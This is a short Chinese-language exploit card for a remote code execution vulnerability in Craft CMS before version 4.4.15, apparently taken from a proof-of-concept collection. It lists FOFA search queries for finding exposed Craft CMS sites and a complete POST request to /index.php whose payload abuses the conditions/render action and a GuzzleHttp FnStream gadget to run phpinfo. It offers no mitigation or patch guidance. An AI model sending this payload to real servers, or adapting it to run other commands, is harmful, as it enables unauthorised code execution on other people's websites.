# CraftCMS存在远程代码执行漏洞

- **系统**：CraftCMS　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`FOFA：`title=="Welcome to Craft CMS" ｜  header="X-Powered-By: Craft CMS"`\`
- **请求**：`POST /index.php HTTP/1.1`
- **关键头**：`Content-Length: 242`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
```

**其他**
- Craft CMS存在远程代码执行漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: CraftCMS < 4.4.15